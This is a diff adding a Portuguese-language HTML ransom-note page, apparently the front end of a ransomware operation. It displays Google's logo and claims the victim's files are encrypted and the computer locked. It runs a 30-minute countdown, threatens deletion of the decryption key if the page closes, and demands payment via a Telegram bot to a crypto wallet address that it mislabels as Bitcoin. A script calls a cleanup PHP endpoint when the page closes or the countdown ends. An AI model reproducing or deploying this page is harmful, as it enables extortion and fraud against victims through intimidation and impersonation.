@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="SHORTCUT ICON" href="logo.ico" type="image/x-icon" />
+    <title>Aviso Importante</title>
+    <style>
+        /* Seu estilo permanece o mesmo */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            color: #202124;
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+        #container-wrapper {
+            width: 50%; /* Tamanho da div maior */
+            display: flex;
+            justify-content: flex-start; /* Alinha o conteúdo à esquerda dentro da div maior */
+            position: relative;
+            padding-top: 100px; /* Espaço para a logo */
+            box-sizing: border-box;
+        }
+        #logo {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        #container {
+            width: 100%;
+            text-align: left; /* Alinha o texto à esquerda */
+            padding-right: 20px; /* Espaço entre o texto e a borda direita da div maior */
+        }
+        #clock {
+            font-size: 1.2em;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        #countdown {
+            font-size: 2.5em;
+            color: #ea4335;
+            margin-bottom: 20px;
+        }
+        #donation {
+            font-size: 1em;
+            color: #3c4043;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        #donation strong {
+            color: #1a73e8;
+        }
+        h3 {
+            color: #202124;
+            font-size: 1.5em;
+            margin-bottom: 20px;
+        }
+        /* Estilo do link */
+        #donateBtn {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-block;
+            padding: 10px 20px;
+            border: 1px solid #1a73e8;
+            border-radius: 5px;
+            background-color: #ffffff;
+        }
+        #donateBtn:hover {
+            background-color: #e8f0fe;
+        }
+        /* Estilo do modal */
+        .modal {
+            display: none; /* Oculta o modal por padrão */
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: #ffffff;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 600px;
+            border-radius: 8px;
+        }
+        .close {
+            color: #aaaaaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: #000;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .container_explica {
+            margin-top:300px;
+        }
+    </style>
+</head>
+<body>
+    <img id="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" width="272" height="92" style="margin-bottom:-15px;">
+    <div id="container-wrapper">
+        <div id="container" style="margin-left:30px;margin-top:60px;">
+            <h2>Como Criar uma Carteira <br> Ronin Wallet e Fazer uma Doação</h2>
+            <p>Para criar uma carteira na Ronin Wallet e fazer uma doação, siga estas etapas:</p>
+            <ol>
+                <li><strong>Baixe e Instale a Ronin Wallet:</strong> Acesse o site oficial da Ronin Wallet e faça o download da extensão para seu navegador ou do aplicativo para dispositivos móveis.</li>
+                <li><strong>Crie sua Carteira:</strong> Siga as instruções para criar uma nova carteira. Guarde sua frase de recuperação em um local seguro.</li>
+                <li><strong>Adicione Fundos:</strong> Transfira criptomoedas para sua nova carteira Ronin.</li>
+                <li><strong>Faça a Doação:</strong> Abra sua Ronin Wallet e envie a quantia desejada para o endereço Bitcoin fornecido: <strong>0x62c639028efbf4e7814b5ac31a7aaccfeb464296</strong>.</li>
+            </ol>
+            <p>Se você tiver dúvidas ou precisar de ajuda, entre em contato com nosso suporte.</p>
+            <center><div id="clock"><center></div><a href="https://t.me/whoami6669">https://t.me/whoami6669 </a>
+        </div>
+    </div>
+    <div id="container-wrapper">
+        <div id="container">
+            <h3>Tempo Restante:</h3>
+            <div id="countdown">00:00:00</div>
+            <div id="donation">
+                <h2 style="color:red;">[!] Não desligue seu computador [!] </h2><p>seus arquivos foram criptografados e seu computador foi bloqueado.<br>
+                compre a key de descriptografia entrando em contato com o bot do telegram!
+                <br> Seu apoio é crucial para continuar navegando 😉.</p>
+                <p><strong>Endereço da Carteira Bitcoin:</strong><br>
+                <span>0x62c639028efbf4e7814b5ac31a7aaccfeb464296</span></p>
+                <p>Se seu computador for desligado ou esta tela for fechada<br>sua key será apagada automaticamente!</p>
+                <a href="#" id="donateBtn">Saiba Como Doar</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="donationModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal">&times;</span>
+            <h4>Como Criar uma Carteira na Ronin Wallet e Fazer uma Doação</h4>
+            <p>Para criar uma carteira na Ronin Wallet e fazer uma doação, siga estas etapas:</p>
+            <ol>
+                <li><strong>Baixe e Instale a Ronin Wallet:</strong> Acesse o site oficial da Ronin Wallet e faça o download da extensão para seu navegador ou do aplicativo para dispositivos móveis.</li>
+                <li><strong>Crie sua Carteira:</strong> Siga as instruções para criar uma nova carteira. Guarde sua frase de recuperação em um local seguro.</li>
+                <li><strong>Adicione Fundos:</strong> Transfira criptomoedas para sua nova carteira Ronin.</li>
+                <li><strong>Faça a Doação:</strong> Abra sua Ronin Wallet e envie a quantia desejada para o endereço Bitcoin fornecido: <strong>0x62c639028efbf4e7814b5ac31a7aaccfeb464296</strong>.</li>
+            </ol>
+            <p>Se você tiver dúvidas ou precisar de ajuda, entre em contato com nosso suporte.</p>
+        </div>
+    </div>
+
+    <script>
+        // função para caso o cliente feche a tela 
+        window.addEventListener('beforeunload', function (event) {
+    navigator.sendBeacon('limpar_data.php');
+});
+        // Função para atualizar o relógio
+        function updateClock() {
+            var now = new Date();
+            var options = { timeZone: 'America/Sao_Paulo', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+            var formatter = new Intl.DateTimeFormat('pt-BR', options);
+            var timeString = formatter.format(now);
+            document.getElementById('clock').textContent = 'Hora de Brasília: ' + timeString;
+        }
+
+        // Função para iniciar o contador regressivo de 30 minutos
+        function startCountdown() {
+            var countdownElement = document.getElementById('countdown');
+            var endTime = new Date().getTime() + 30 * 60 * 1000; // 30 minutos de contagem regressiva
+            var interval = setInterval(function() {
+                var now = new Date().getTime();
+                var remainingTime = endTime - now;
+                
+                if (remainingTime <= 0) {
+                    clearInterval(interval);
+                    countdownElement.textContent = '00:00:00';
+                    triggerPHP(); // Chama a função para acessar o PHP
+                } else {
+                    var hours = Math.floor((remainingTime % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                    var minutes = Math.floor((remainingTime % (1000 * 60 * 60)) / (1000 * 60));
+                    var seconds = Math.floor((remainingTime % (1000 * 60)) / 1000);
+                    countdownElement.textContent = 
+                        (hours < 10 ? '0' : '') + hours + ':' + 
+                        (minutes < 10 ? '0' : '') + minutes + ':' + 
+                        (seconds < 10 ? '0' : '') + seconds;
+                }
+            }, 1000);
+        }
+
+        // Função para fazer a requisição ao PHP
+        function triggerPHP() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "limpar_data.php", true);
+            xhr.send();
+        }
+
+        // Função para abrir o modal
+        var modal = document.getElementById("donationModal");
+        var btn = document.getElementById("donateBtn");
+        var span = document.getElementById("closeModal");
+
+        btn.onclick = function(event) {
+            event.preventDefault();
+            modal.style.display = "flex";
+        }
+
+        span.onclick = function() {
+            modal.style.display = "none";
+        }
+
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+
+        // Atualiza o relógio e inicia o contador regressivo
+        setInterval(updateClock, 1000);
+        startCountdown();
+    </script>
+</body>
+</html>
